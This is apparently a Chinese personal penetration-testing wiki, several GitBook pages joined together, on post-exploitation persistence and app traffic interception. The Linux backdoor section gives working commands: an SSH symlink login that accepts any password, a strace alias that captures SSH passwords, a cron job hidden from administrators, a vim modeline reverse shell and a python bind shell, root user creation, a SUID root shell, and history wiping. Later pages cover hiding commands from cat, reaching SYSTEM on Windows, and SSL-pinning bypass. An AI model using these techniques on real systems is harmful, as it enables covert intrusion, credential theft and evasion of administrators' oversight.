可以看到我利用socat限制了本地端口19526访问server的22端口反回一个sh窗。 修改端口可以修改..LF import struct buffer = struct.pack('>I6',19526) print repr(buffer) 优点： 1、在无连接后门的情况下，管理员是看不到端口和进程的，last也查不到登陆。 2、在针对边界设备出网，内网linux服务器未出网的情况下，留这个后门可以随时管理内网linux服务器，还不会留下文件和恶意网络连接记录。 SSH 软连接后门 软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息（su），然而su在pam_rootok只检测uid 0即可认证成功，这样就导致了可以使用任意密码登录。 ln -sf /usr/sbin/sshd /tmp/su /tmp/su -oPort=888 优点：能够绕过一些网络设备的安全流量监测 缺点：本地在查看监听端口时会暴露端口，建议设置成8081，8080等端口。 SSH 公钥免密登陆 ssh-keygen -t rsa生成公钥 将id_rsa.pub内容放到目标.ssh/authorized_keys里 这个是老生常谈的公钥免登陆，这种用法不只是用在留后门，还可以在一些特殊情况下获取一个交互的shell，如struts写入公钥，oracle写入公钥连接等情景。 SSH Keylogger 利用strace系统调试工具获取ssh的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。 在当前用户的.bashrc里新建一条alias、这样可以抓取他登陆其他机器的ssh密码。算是alias后门。后面会在讲一下alias后门。 alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh' strace监听ssh来源流量 不只是可以监听连接他人，还可以用来抓到别人连入的密码。应用场景如：通过漏洞获取root权限，但是不知道明文密码在横向扩展中可以使用。 之前有用别名的方式来抓取登陆其他机器时的密码、同样也可以利用strace来监听登陆本地的sshd流量。 ps -ef | grep sshd #父进程PID 可以看到也能抓到写入密码。 Info： https://www.jakoblell.com/blog/2014/05/07/hacking-contest-ssh-server-wrapper https://www.freebuf.com/articles/system/178150.html Cron后门 Cron介绍 在Linux系统中，计划任务一般是由cron承担，我们可以把cron设置为开机时自动启动。cron启动后，它会读取它的所有配置文件（全局性配置文件/etc/crontab，以及每个用户的计划任务配置文件），然后cron会根据命令和执行时间来按时来调用工作任务。 Cron后门 http://qqe2.com/cron cron表达式在线生成： (crontab -l;echo '*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i')|crontab - 这样执行会在crontab列表里出现，如果是如上执行的话，管理员执行crontab -l就能看到执行的命令内容不是特别隐蔽。 那么就有了一个相对的高级用法，下面命令执行后会显示”no crontab for root”。其实就达到了一个隐藏的效果，这时候管理员如果执行crontab -l就会看到显示”no crontab for root”。 (crontab -l;printf \"*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\\rno crontab for `whoami`%100c\\n\")|crontab - 实际上是他将cron文件写到文件中。/var/spool/cron/crontabs/root 。而crontab -l就是列出了该文件的内容。 通常cat是看不到这个的，只能利用less或者vim看到，这也是利用了cat的一个缺陷，后面会讲到。 /etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.hourly/ /etc/cron.monthly/ 这几个路径都可以存放cron执行脚本,对应的时间不同。 hiding-from-cats cat隐藏说明 刚刚在cron里面提到了cat的一个缺陷。可以利用这个缺陷隐藏恶意命令在一些脚本中。这里的示例我就用hiding-from-cats里的例子吧。之所以单列出来，个人认为在一些大型企业的运维工具脚本中可以插入恶意代码，利用cat的缺陷还可以使管理员无法发现脚本被做手脚。 cat其实默认使用是支持一些比如\\r回车符 \\n换行符 \\f换页符、也就是这些符号导致的能够隐藏命令。 使用python生成带有换行符的内容sh： cmd_h = \"echo 'You forgot to check `cat -A`!' > oops\" # hidden cmd_v = \"echo 'Hello world!'\" # visible with open(\"test.sh\", \"w\") as f: output = \"#!/bin/sh\\n\" output += cmd_h + \";\" + cmd_v + \" #\\r\" + cmd_v + \" \" * (len(cmd_h) + 3) + \"\\n\" f.write(output) 使用coderunner生成了一个test.sh脚本。cat看了下脚本的内容是echo一个hello world! 且同目录下只有他本文件。然后我们用sh test.sh执行后。 可以看到执行脚本后生成了一个oops文件，内容就是 You forgot to check cat -A! 其实可以看出来这样就做到了恶意命令隐藏的效果。其实之前Cron后门中的隐藏方法就是利用了这个。如果使用cat —A 查看root文件的话就可以看到计划任务的真正内容了。 vim后门 vim modeline CVE-2019-12735 该漏洞存在于编辑器的 modeline功能，部分 Linux 发行版默认启用了该功能，macOS 是没有默认启用。 当vim打开一个包含了vim modeline注释行的文件时，会自动读取这一行的参数配置并调整自己的设置到这个配置。vim默认关闭modeline。 开启： vim ~/.vimrc //文件内容为 set modeline poc: :!uname -a||\" vi:fen:fdm=expr:fde=assert_fails(\"source\\!\\ \\%\"):fdl=0:fdt=\" 反弹shell： :!rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 9999 >/tmp/f||\" vi:fen:fdm=expr:fde=assert_fails(\"source\\!\\ \\%\"):fdl=0:fdt=\" vim python扩展后门 适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统。可以通过vim的pyfile来执行python脚本。这里我复现使用了docker centos 6.8，yum默认安装的vim。下面的pdf是发现者对外公开的思路： https://github.com/jaredestroud/WOTD/blob/master/%5BDARK%5D%20Weapons%20of%20%20Text%20Destruction.pdf 这里我们使用一个python开启本地监听11端口的脚本。 POC: #from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html from socket import * import subprocess import os, threading, sys, time if __name__ == \"__main__\": server=socket(AF_INET,SOCK_STREAM) server.bind(('0.0.0.0',11)) server.listen(5) print 'waiting for connect' talk, addr = server.accept() print 'connect from',addr proc = subprocess.Popen([\"/bin/sh\",\"-i\"], stdin=talk, stdout=talk, stderr=talk, shell=True) $(nohup vim -E -c \"pyfile dir.py\"> /dev/null 2>&1 &) && sleep 2 && rm -f dir.py 执行以后： 我在攻击机nc连接过去就可以了。 添加超级用户 useradd guest;echo 'guest:123456'|chpasswd useradd -p `openssl passwd 123456` guest useradd -p \"$(openssl passwd 123456)\" guest useradd newuwer;echo -e \"123456n123456n\" |passwd newuser # 赋予root权限 echo \"guest:x:0:0::/:/bin/sh\" >> /etc/passwd echo 'guest:123456'|chpasswd SUID后门 当一个文件所属主的x标志位s(set uid简称suid)时，且所属主为root时，当执行该文件时，其实是以root身份执行的。必要条件： SUID权限仅对二进制程序有效。 执行者对于该程序需要具有x的可执行权限 本权限仅在执行该程序的过程中有效 在执行过程中执行者将具有该程序拥有者的权限 可以利用webshell进行利用 #vim suid.c #include main () { setuid(0); system(\"/bin/bash\"); } # 编译成二进制文件 gcc suid.c -o suidshell # 赋予suid权限 chmod 4755 suidshell chmod u+s suidshell # 假设webshell权限较低，希望使用suid shell执行root命令，通过web的方式调用 # http://localhost/suid.php?path=/tmp/suidshell&cmd=id # 即可以root的权限执行命令id 检测 查找具有suid权限的文件即可 find / -perm +4000 -ls find / -perm -u=s -type f 2>/dev/null 清除 清除文件即可 Linux/Unix 隐藏文件和文件夹 建立隐藏文件/文件夹 touch .backdoor mkdir .backdoor-file 经常使用linux中会知道每个目录下其实都有.和..、分别代指的是当前目录和上级目录。 建立...文件也是一个比较好的隐藏方法。 建立..文件/文件夹 echo 'whoami' > ..\\ \\ \\ \\ # 注意最后一个转义符后有一个空格 bash ..\\ \\ \\ \\ \\ # 这里也是多一个空格。 这样建立的文件/文件夹管理员不知道是使用了几个转义符建立的，所以通过rm+tab是无法删除的。而且我测试使用rm -rf ./*也无法删除。 参数混淆拦截rm 使用echo等工具新建一个文件名是-rm的文件，这样删除的时候bash会认为-rm是rm的参数。 这样就可以阻止管理员去删除， 一般只有rm -- '-rm'才会删除掉。 但是如果管理员使用正常删除方式会报错。 可以用以下方法。 echo 123123123 > -- 这样可以看到，命令执行了，文件没删除，命令也没有报错。类似的可以利用bash的\\r缺陷，和管道符、重定向符之类的。 创建不能删除的文件(权限隐藏) 这个用法在ctf、awd中应用很多，使用chattr来给与隐藏权限。 这些权限需要使用lsattr这个命令才可以查看到，而如果要修改隐藏权限，则使用chattr这个命令来进行修改。 chattr +i hack.sh 无法删除。 删除/隐藏历史操作命令 删除 删除通常使用两种方式： history -c rm -rf /root/.bash_history 建议使用第二种，第一种只是当前清除，并没有清除文件内容。 隐藏 隐藏命令的方式有很多，history 只会在会话结束时写入，所以只要会话还没有结束就可以想办法隐藏。比如同时开启两个终端，第一个终端启动vim编辑history文件，等第二个执行的都差不多了，结束会话后，在保存第一个，这样就覆盖了第二个终端所执行的命令。 这里我分享几个经常使用的隐藏历史命令的方法。 set +o history # 不会将任何当前会话写入日志。可以在会话期间任何时间运行，并隐藏所有命令。 export HISTIGNORE=\"*|*\" //这条命令是不记录带有管道符的命令。 执行后命令可以echo 123123123 | whoami这样也可以做到隐藏命令的目的。 Info： https://www.freebuf.com/vuls/205516.html https://www.cnblogs.com/17bdw/p/10564902.html#label0_6_ 参考链接 https://mp.weixin.qq.com/s/B5cam9QN8eDHFuaFjBD34Q https://mp.weixin.qq.com/s/-F_Ol-J-QfynOCYfD1nG3Q https://www.secpulse.com/archives/100484.html Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-08 18:29:59 "},"个人知识库/01.渗透测试/04.权限维持/03.扩展.html":{"url":"个人知识库/01.渗透测试/04.权限维持/03.扩展.html","title":"03.扩展","keywords":"","body":" 从admin到system 前提 目录 创建服务的方法 SC 计划任务 利用工具 psExec 其他的 cat的一个缺陷 说明 举例 实操 1. 直接隐藏 2. 隐藏在正常的脚本里面 总结 从admin到system 在渗透测试中，某些情况下需要用到system权限，例如操作注册表 HKEY_LOCAL_MACHINE\\SAM\\SAM，或者本地测试时需要system权限 前提 已经获得系统的管理员权限（administrator） 参考链接： https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/ https://blog.xpnsec.com/becoming-system/ 目录 通过创建服务获得System权限的方法 利用MSIExec获得System权限的方法 利用token复制获得System权限的方法 利用Capcom.sys获得System权限的方法 创建服务的方法 SC sc create testServ binPath= \"cmd /c start\" type= own type= interact sc start testServ 适用于XP win7、win8不好用 计划任务 at （高版本被弃用） at 11:06 /interactive calc schtasks # 创建服务 schtasks /Create /TN testServ /SC DAILY /ST 11:10 /TR calc.exe /RU SYSTEM # 查看服务状态 schtasks /Query /TN testServ # 删除服务： schtasks /Delete /TN testServ /F 利用工具 psExec 下载地址 https://docs.microsoft.com/en-gb/sysinternals/downloads/psexec 使用psexec会创建 PSEXESVC 服务（测试的时候没找到这个服务），产生日志Event 4697、Event 7045、Event 4624和Event 4652 以system权限启动： psexec.exe -accepteula -s -d notepad.exe 默认情况下，system权限的进程不会在用户桌面显示，如果需要显示进程界面，可以加/i参数，命令如下： psexec.exe -accepteula -s -i -d notepad.exe 参数解释 -accepteula 隐藏psexec第一次运行时弹出的提示是否许可执行的窗口 -s system权限运行 -i 交互式 -d 执行命令后返回，不等待命令结束 其他的 https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/ cat的一个缺陷 说明 cat有一个缺陷，如果内容中存在 \\r 回车符，那么在cat直接查看的时候会首先输出\\r后的内容，如果\\r后的内容长度小于 \\r 前的内容长度，那么就会输出 \\r 后的内容在加上 \\r 前的长度差的后几位。 利用这个可以隐藏在一些脚本里面，比如 crontab， 直接 cat file 的查看方式会让运维不能发现问题。但是可以通过 vim less 查看到。 举例 看了上面的说明，可能还是不是很清楚，举个例子说明一下就很明白了。 # 示例代码 with open(\"result.sh\", \"w\") as f: hiding_content = \"1234567\" output = hiding_content + \"\\r11111\" f.write(output) 会先输出 \\r 后的 11111 ，由于 len(\"\"1234567\"\") - len(\"11111)\" = 2 ，所有最后会输出 1234567 的最后两位 实操 因为 cat 输出空文件和输出空格，肉眼看起来是一样的，所以可以利用空格来隐藏我们要执行的命令 1. 直接隐藏 with open(\"result.sh\", \"w\") as f: hiding_content = \"echo I am hidden content\" output = hiding_content + \"\\r\" + \" \" * len(hiding_content) f.write(output) 2. 隐藏在正常的脚本里面 original_content = \"echo I am normal content\" with open(\"result.sh\", \"w\") as f: hiding_content = \"echo I am hidden content;\" output = hiding_content + \"\\r\" + original_content + \" \" * len(hiding_content) f.write(output) 总结 只要是可能会用cat看的地方，都可以做一下手脚，结合权限维持还不错。 有些说得不太准确的地方，望大佬们指正。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-08 18:30:32 "},"个人知识库/01.渗透测试/05.APP小程序/01.获取微信小程序源码.html":{"url":"个人知识库/01.渗透测试/05.APP小程序/01.获取微信小程序源码.html","title":"01.获取微信小程序源码","keywords":"","body":" 方法一：直接抓包法 前提 操作步骤 结果 方法二：本地缓存文件读取法 前提 操作步骤 结果 其他 微信开发者工具调试 调试过程 参考 获取支付宝小程序的源码 JS美化 获取微信小程序的源码 方法一：直接抓包法 小程序一般会先向微信服务器上下载小程序的资源，所以抓包一定情况下可以看到 新版的微信小程序采用了zstd压缩，所以下载后需要先解压，老版本没压缩可以直接下载源码，这是一个需要注意的地方 前提 手机上无该小程序的缓存文件，如果有，进行如下操作 操作步骤 1、使用fiddler抓包，获取小程序资源下载链接 PS：burp也可以，只是感觉fiddler抓手机包更快 2、下载小程序 3、zstd解压 zstd -d xxx.zstd 4、解压后添加后缀.wxapkg，然后进行反编译，此处以wxappUnpacker为例 结果 反编译后的目录结果 反编译后的内容 方法二：本地缓存文件读取法 网上基本都用的这个办法，感觉不如上面那个好用，还麻烦！！！ 这是2019年记录的，可能现在存在一些误差，有问题及时联系我 前提 手机root 手机已经访问过小程序，在系统中存在缓存 安装RE文件管理器 操作步骤 1、首先访问如下目录/data/data/com.tencent.mm/MicroMsg/，找到wxapkg文件 2、拖到电脑（此处我用的adb，也可以使用模拟器的共享文件夹等） ## adb命令 adb pull /data/data/com.tencent.mm/MicroMsg/d32f736510b7c9582b5fc1aa3673b2bb/appbrand/pkg/debug_826840826_2_-1071461312 3、使用WxApkgUnpacker.exe反编译wxapkg获取源文件 结果 其他 有些工具下载地址挂了，可以多在github上找找，这里提供一些本地下载吧 WxApkgUnpacker.exe wxappUnpacker-master.zip mp-unpack.Setup.1.1.1.exe mp-unpack-1.1.1.dmg 微信开发者工具调试 可选步骤，一般不需要 下载地址：https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html 调试过程 下载安装后打开，导入反编译的源码 点击编译（不编译看着也比较舒服吧哈哈） 编译完成后就可以自己调试了 如果代码存在混淆等情况，可能编译不成功，不过也不太影响我们测试，因为我们也主要是分析各个接口的东西；如果有加密什么的，能调试就很方便 放一张别人编译成功的图吧 参考 小程序渗透测试-前端打包调试解密 获取支付宝小程序的源码 和微信小程序差不多，只是路径不一样，支付宝小程序的路径为 /data/data/com.eg.android.AlipayGphone/files/nebulaInstallApps 另外具体目录名为小程序tinyAppId值，其中的tar包即为源码文件。tar包未加密，adb pull出来之后直接解压即可 JS美化 源码基本都是前后端分离的前端，所以基本都是js、html什么的，直接看比较费眼睛，结合一下效果挺好。 用微信开发者工具调试，会自动高亮，不过混淆的也不好看 搜索引擎搜索 js在线美化 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-10-09 15:03:09 "},"个人知识库/01.渗透测试/05.APP小程序/02.Xserver.html":{"url":"个人知识库/01.渗透测试/05.APP小程序/02.Xserver.html","title":"02.Xserver","keywords":"","body":" Xserver 下载地址 Hook adb端口转发 选择一个app 打开app 打开本地127.0.0.1:8000，即可成功hook的web界面了 使用 模拟器设置好burp代理，打开测试的app 加载所有方法 输入规则过滤，并且hook hook后运行app，发起网络请求 点击decrypt方法 burp中看到的数据，后面app操作中所有解密的地方burp都能看到 Xserver 下载地址 xserver Hook adb端口转发 如果转发了8000端口本地还访问不到，那可能因为某些原因它初始化的时候没有在8000上，所以这个时候需要通过找PID的值进行转发。 adb forward tcp:8000 tcp:8000 选择一个app 打开app 打开本地127.0.0.1:8000，即可成功hook的web界面了 使用 模拟器设置好burp代理，打开测试的app 主要介绍两个功能，一个是trace，访问地址是http://localhost:8000/tracer 一个是hook，访问地址是http://localhost:8000/invoke 加载所有方法 可以看到加载了136759个方法。 输入规则过滤，并且hook 这个靠猜，比如decode、decrypt、AES、DES等 hook后运行app，发起网络请求 可以看到明文数据，说明找到了对应的解密方式 点击decrypt方法 进入后，在框内输入加密后的内容，点击invoke即可解密，可以在burp中看到过程 burp中看到的数据，后面app操作中所有解密的地方burp都能看到 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-11-17 08:42:00 "},"个人知识库/01.渗透测试/05.APP小程序/03.HTTP单向验证+双向验证解释.html":{"url":"个人知识库/01.渗透测试/05.APP小程序/03.HTTP单向验证+双向验证解释.html","title":"03.HTTP单向验证+双向验证解释","keywords":"","body":" HTTP简介 HTTPS单向认证 HTTPS双向认证 HTTPS基本思路总结 抓包原理 反抓包策略 突破SSL-Pinning抓包 突破证书双向验证抓包 总结 HTTP简介 HTTP（HyperText Transfer Protocol，超文本传输协议）被用于在Web浏览器和网站服务器之间传递信息，在TCP/IP中处于应用层。这里提一下TCP/IP的分层共分为四层：应用层、传输层、网络层、数据链路层; 分层的目的是：分层能够解耦，动态替换层内协议 各个层包含的内容： 应用层：向用户提供应用服务时的通讯活动（ftp，dns，http） 传输层：网络连接中两台计算机的数据传输（tcp、udp） 网络层：处理网络上流动的数据包，通过怎样的传输路径把数据包传送给对方（ip） 数据链路层：与硬件相关的网卡、设备驱动等等 然而HTTP也有以下明显缺点： 通信使用明文，内容可能被窃听 不验证通信方的身份，因此有可能遭遇伪装 无法证明报文的完整性，所以有可能遭到篡改 这样，HTTPS就登场了。HTTPS中的S表示SSL或者TLS，就是在原HTTP的基础上加上一层用于数据加密、解密、身份认证的安全层，即 HTTP + 加密 + 认证 + 完整性保护 = HTTPS 加密相关的预备知识：对称加密和非对称加密。 对称加密 ： 加密和解密数据使用同一个密钥。这种加密方式的特点是速度很快，常见对称加密的算法有 AES； 非对称加密： 加密和解密使用不同的密钥，这两个密钥形成有且仅有唯一的配对，叫公钥和私钥。数据用公钥加密后必须用私钥解密，数据用私钥加密后必须用公钥解密。一般来说私钥自己保留好，把公钥公开给别人（一般公钥不会单独出现，而是会写进证书中），让别人拿自己的公钥加密数据后发给自己，这样只有自己才能解密。 这种加密方式的特点是速度慢，CPU 开销大，常见非对称加密算法有 RSA。 CA证书的相关知识： CA证书是由CA（Certification Authority）机构发布的数字证书。其内容包含：电子签证机关的信息、公钥用户信息、公钥、签名和有效期。这里的公钥服务端的公钥，这里的签名是指：用hash散列函数计算公开的明文信息的信息摘要，然后采用CA的私钥对信息摘要进行加密，加密完的密文就是签名。 即：证书 = 公钥 + 签名 +申请者和颁发者的信息。 客户端中因为在操作系统中就预置了CA的公钥，所以支持解密签名（因为签名使用CA的私钥加密的） 有了这些预备知识后，就可以来看看HTTPS是如何怎么做到安全认证的。 HTTPS单向认证 从上图可以看出，服务端拥有一对非对称密钥：B公钥和B私钥。详细过程如下： （1）客户端发起HTTPS请求，将SSL协议版本的信息发送给服务端。 （2）服务端去CA机构申请来一份CA证书，在前面提过，证书里面有服务端公钥和签名。将CA证书发送给客户端 （3）客户端读取CA证书的明文信息，采用相同的hash散列函数计算得到信息摘要（hash目的：验证防止内容被修改），然后用操作系统带的CA的公钥去解密签名（因为签名是用CA的私钥加密的），对比证书中的信息摘要。如果一致，则证明证书是可信的，然后取出了服务端公钥 （4）客户端生成一个随机数（密钥F），用刚才等到的服务端B_公钥去加密这个随机数形成密文，发送给服务端。 （5）服务端用自己的B_私钥去解密这个密文，得到了密钥F （6）服务端和客户端在后续通讯过程中就使用这个密钥F进行通信了。和之前的非对称加密不同，这里开始就是一种对称加密的方式 HTTPS双向认证 双向认证和单向认证原理基本差不多，单向认证客户端需要认证服务端，而在双向认证中增加了服务端对客户端的认证 双向认证详细过程如下： （1）客户端发起HTTPS请求，将SSL协议版本的信息发送给服务端。 （2）服务端去CA机构申请来一份CA证书，在前面提过，证书里面有服务端公钥和签名。将CA证书发送给客户端 （3）客户端读取CA证书的明文信息，采用相同的hash散列函数计算得到信息摘要（hash目的：验证防止内容被修改），然后用操作系统带的CA的公钥去解密签名（因为签名是用CA的私钥加密的），对比证书中的信息摘要。如果一致，则证明证书是可信的，然后取出了服务端公钥 （4）客户端发送自己的客户端证书给服务端，证书里面有客户端的公钥：C_公钥 （5）客户端发送支持的对称加密方案给服务端，供其选择 （6）服务端选择完加密方案后，用刚才得到的C_公钥去加密选好的加密方案 （7）客户端用自己的C私钥去解密选好的加密方案，客户端生成一个随机数（密钥F），用刚才等到的服务端B公钥去加密这个随机数形成密文，发送给服务端。 （8）服务端和客户端在后续通讯过程中就使用这个密钥F进行通信了。和之前的非对称加密不同，这里开始就是一种对称加密的方式 HTTPS基本思路总结 HTTPS在保证数据安全传输上使用对称加密和非对称加密相结合的方式来进行的，简单来说就是通过一次非对称加密算法进行了最终通信密钥的生成、确认和交换，然后在后续的通信过程中使用最终通信密钥进行对称加密通信。之所以不是全程非对称加密，是因为非对称加密的计算量大，影响通信效率。 抓包原理 常用的HTTPS抓包方式是作为中间人，对客户端伪装成服务端，对服务端伪装成客户端。简单来说： 截获客户端的HTTPS请求，伪装成中间人客户端去向服务端发送HTTPS请求 接受服务端返回，用自己的证书伪装成中间人服务端向客户端发送数据内容。 具体过程如下图所示： 反抓包策略 为了防止中间人攻击，可以使用SSL-Pinning的技术来反抓包。 可以发现中间人攻击的要点的伪造了一个假的服务端证书给了客户端，客户端误以为真。解决思路就是，客户端也预置一份服务端的证书，比较一下就知道真假了。 SSL-pinning有两种方式： 证书锁定（Certificate Pinning） 和公钥锁定（ Public Key Pinning）。 证书锁定 需要在客户端代码内置仅接受指定域名的证书，而不接受操作系统或浏览器内置的CA根证书对应的任何证书，通过这种授权方式，保障了APP与服务端通信的唯一性和安全性，因此客户端与服务端（例如API网关）之间的通信是可以保证绝对安全。但是CA签发证书都存在有效期问题，缺点是在 证书续期后需要将证书重新内置到APP中。 公钥锁定 提取证书中的公钥并内置到客户端中，通过与服务器对比公钥值来验证连接的正确性。制作证书密钥时，公钥在证书的续期前后都可以保持不变（即密钥对不变），所以可以避免证书有效期问题，一般推荐这种做法。 突破SSL-Pinning抓包 思路是这样的：内置证书或者公钥的时候，常常会有对比验证的函数，直接控制这个函数的返回结果让验证通过不就好了吗。 于是就有了一个突破SLL-Pinning的经典操作：采用Xposed+justTrustme模块。 这个方案使用的是JustTrustMe这个Xposed模块，它所做的事情就是将各种已知的的HTTP请求库中用于校验证书的API都进行Hook，使无论是否是可信证书的情况，校验结果返回都为正常状态，从而实现绕过证书检查的效果。 突破证书双向验证抓包 参考《证书双向验证抓包.md》 总结 单向认证客户端需要认证服务端，而在双向认证中增加了服务端对客户端的认证。 https抓不到包可能是使用了SSL Pinning或者证书双向验证来防止的。 HTTPS抓不到包的情况下，进行以下尝试 判断是不是SSL Pinning的技术来反抓包（直接用Xposed+justTrustme模块看看能不能抓包） 突破证书双向验证进行抓包 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-11-17 08:42:00 "},"个人知识库/01.渗透测试/05.APP小程序/04.证书双向验证抓包.html":{"url":"个人知识库/01.渗透测试/05.APP小程序/04.证书双向验证抓包.html","title":"04.证书双向验证抓包","keywords":"","body":" 证书双向验证抓包 先尝试一下是不是单向验证+SSL pinning来防止抓包的 方法一：Xposed加载JustTrustMe模块 方法二：使用frida的ssl_pinning的js模块 打开soul app，抓包 双向验证抓包开始 直接解压apk 找一下证书 找一下证书密码 反编译分析啥的太麻烦了，不太会，所以还是用frida吧 本地安装并信任证书 burp添加p12证书 验证 证书双向验证抓包 此处以soal app为例 首先需要下载soul app，然后安装 先尝试一下是不是单向验证+SSL pinning来防止抓包的 方法一：Xposed加载JustTrustMe模块 方法二：使用frida的ssl_pinning的js模块 frida -U -l ssl_unpinning.js -f cn.soulapp.android # 注意 -f 后面接的是 package name，从设备中读取的 打开soul app，抓包 提示 400 No required SSL certificate was sent，说明是证书双向验证的 双向验证抓包开始 直接解压apk 找一下证书 如果服务器端会对客户端证书进行校验, 证书应该就直接存放在apk里 证书一般放到目录 /asset 或者 /res/raw 目录下的，如果没找到，可以用 find 找一下后缀为 .cer .p12 .pfx 的文件 这里找到证书为 client.p12 找一下证书密码 在我们要使用该证书的时候, 需要输入安装证书的密码。 找到p12证书的话，可以通过这个证书+密码转换成本机安装的证书格式，比如cer。 反编译分析啥的太麻烦了，不太会，所以还是用frida吧 frida -U -l tracer_keystore.js -f cn.soulapp.android 本地安装并信任证书 burp添加p12证书 打开Burp --> User Options-->Client SSL Certificates --> Add -->Host设置前面返回400的地址，证书类型选 PKCS#12 选择刚才看到的p12证书，然后输入frida提取到的密码。 验证 再次抓包，可见能成功抓取到https的包。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-11-17 08:42:00 "},"个人知识库/01.渗透测试/06.保护自己/01.GitHub云扫描器.html":{"url":"个人知识库/01.渗透测试/06.保护自己/01.GitHub云扫描器.html","title":"01.GitHub云扫描器","keywords":"","body":" 前言 过程举例 分析 GitHub Actions 是什么？ 基本概念 workflow 文件 name on on.. jobs..name jobs..needs jobs..runs-on jobs..steps PortScan-AllPort分析 举一反三 前言 GitHub提供六小时的容器使用时长。 可以利用其进行对外的端口扫描、目录扫描等操作。 过程举例 https://github.com/inbug-team/InCloud 运行于GitHub Actions 的仓库中自动化、自定义和执行软件开发工作流程，可以自己根据喜好定制功能，InCloud已经为您定制好了八种针对网段和域名的不同场景的信息收集与漏洞扫描流程。 PortScan-AllPort 对单IP文件列表进行全端口扫描，输出可用Web服务标题。 PortScan-AllPort-Xray-Dirscan 对单IP文件列表进行全端口扫描，输出可用Web服务标题，对Web服务进行Xray爬虫爬取与漏洞扫描，对Web服务进行Ffuf目录递归扫描。。 PortScan-Top1000 对单C段IP列表进行Top1000端口扫描，输出可用Web服务标题。 PortScan-Top1000-Xray 对单C段IP列表进行Top1000端口扫描，输出可用Web服务标题，对Web服务进行Xray爬虫爬取与漏洞扫描。 PortScan-Top1000-Dirscan 对单C段IP列表进行Top1000端口扫描，输出可用Web服务标题，，对Web服务进行Ffuf目录递归扫描。 SubDomain-Portscan-Vulnscan 对域名进行子域名枚举与接口查询，对查询的子域名进行Top1000端口扫描，输出可用Web服务标题，对Web服务进行Nuclei漏洞扫描。 SubDomain-Portscan-Xray 对域名进行子域名枚举与接口查询，对查询的子域名进行Top1000端口扫描，输出可用Web服务标题，对Web服务进行Xray爬虫爬取与漏洞扫描。 SubDomain-Portscan-Dirscan 对域名进行子域名枚举与接口查询，对查询的子域名进行Top1000端口扫描，输出可用Web服务标题，，对Web服务进行Ffuf目录递归扫描。 这里以端口扫描为例 1、将项目fork到自己的github，选择端口扫描的分支。 2、修改流程文件（.github/workflows/incloud.yaml）里的 git config --local user.email 与 git config --global user.name 改成自己的邮箱与自己的ID（用于报告输出，可忽略）。 3、修改input目录的扫描目标 4、使用action标签进行在线编译。 5、查看运行的任务 6、点击build可查看对应的运行过程 7、GitHub提供六小时的容器使用时长，扫描结束后，扫描结果会自动上传到自己fork的output文件夹下。 8、需要更新最新版本，请删除fork的项目再重新fork此项目。 分析 GitHub Actions 入门教程 GitHub官方文档 GitHub官方市场 GitHub Actions 是什么？ 大家知道，持续集成由很多操作组成，比如抓取代码、运行测试、登录远程服务器，发布到第三方服务等等。GitHub 把这些操作就称为 actions。 很多操作在不同项目里面是类似的，完全可以共享。GitHub 注意到了这一点，想出了一个很妙的点子，允许开发者把每个操作写成独立的脚本文件，存放到代码仓库，使得其他开发者可以引用。 如果你需要某个 action，不必自己写复杂的脚本，直接引用他人写好的 action 即可，整个持续集成过程，就变成了一个 actions 的组合。这就是 GitHub Actions 最特别的地方。 GitHub 做了一个官方市场，可以搜索到他人提交的 actions。另外，还有一个 awesome actions 的仓库，也可以找到不少 action。 上面说了，每个 action 就是一个独立脚本，因此可以做成代码仓库，使用userName/repoName的语法引用 action。比如，actions/setup-node就表示github.com/actions/setup-node这个仓库，它代表一个 action，作用是安装 Node.js。事实上，GitHub 官方的 actions 都放在 github.com/actions 里面。 既然 actions 是代码仓库，当然就有版本的概念，用户可以引用某个具体版本的 action。下面都是合法的 action 引用，用的就是 Git 的指针概念，详见官方文档。 actions/setup-node@74bc508 # 指向一个 commit actions/setup-node@v1.0 # 指向一个标签 actions/setup-node@master # 指向一个分支 基本概念 GitHub Actions 有一些自己的术语。 （1）workflow （工作流程）：持续集成一次运行的过程，就是一个 workflow。 （2）job （任务）：一个 workflow 由一个或多个 jobs 构成，含义是一次持续集成的运行，可以完成多个任务。 （3）step（步骤）：每个 job 由多个 step 构成，一步步完成。 （4）action （动作）：每个 step 可以依次执行一个或多个命令（action）。 workflow 文件 GitHub Actions 的配置文件叫做 workflow 文件，存放在代码仓库的.github/workflows目录。 workflow 文件采用 YAML 格式，文件名可以任意取，但是后缀名统一为.yml，比如foo.yml。 一个库可以有多个 workflow 文件。GitHub 只要发现.github/workflows目录里面有.yml文件，就会自动运行该文件。 workflow 文件的配置字段非常多，详见官方文档。下面是一些基本字段。 name name字段是 workflow 的名称。如果省略该字段，默认为当前 workflow 的文件名。 name: GitHub Actions Demo on on字段指定触发 workflow 的条件，通常是某些事件。 on: push 上面代码指定，push事件触发 workflow。 on字段也可以是事件的数组。 on: [push, pull_request] 上面代码指定，push事件或pull_request事件都可以触发 workflow。 